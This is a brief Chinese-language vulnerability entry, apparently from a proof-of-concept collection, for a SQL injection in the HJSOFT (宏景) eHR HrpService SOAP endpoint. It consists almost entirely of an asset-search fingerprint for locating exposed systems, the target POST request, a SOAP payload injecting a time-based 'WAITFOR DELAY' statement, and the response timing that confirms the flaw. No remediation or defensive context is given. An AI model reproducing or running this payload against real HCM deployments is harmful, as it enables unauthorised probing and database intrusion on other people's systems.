# 宏景eHRHrpService存在SQL注入漏洞

宏景 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /services/HrpService HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hr="http://www.hjsj.com/HrpService">
<soapenv:Header/>
<soapenv:Body>
<hr:processResult>
<arg0>1);WAITFOR DELAY '0:0:5'--</arg0>
<arg1></arg1>
</hr:processResult>
</soapenv:Body>
</soapenv:Envelope>
:---
```
- **响应特征**：200 响应时间>=5s